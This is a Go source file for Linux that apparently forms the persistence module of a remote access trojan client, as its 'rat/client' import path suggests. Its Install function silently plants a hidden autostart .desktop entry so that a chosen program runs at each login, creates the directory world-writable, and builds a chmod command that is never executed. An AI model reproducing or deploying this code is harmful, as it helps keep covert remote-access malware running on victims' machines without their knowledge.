//+build linux

package startup

import (
	"os"
	"os/exec"
	"rat/client/computer"
)

func Install(name, path string) error {
	home := computer.GetComputerInformation().HomeDir

	dir := home + "/.config/autostart/"
	_, err := os.Stat(dir)
	if err != nil {
		os.Mkdir(dir, 0777)
	}

	file, err := os.Create(dir + name + ".desktop")
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(`
		[Desktop Entry]
		Type=Application
		Name=` + name + `
		Exec=` + path + `
		Terminal=false
		NoDisplay=true
	`)

	exec.Command("chmod", "+x", path)

	return err
}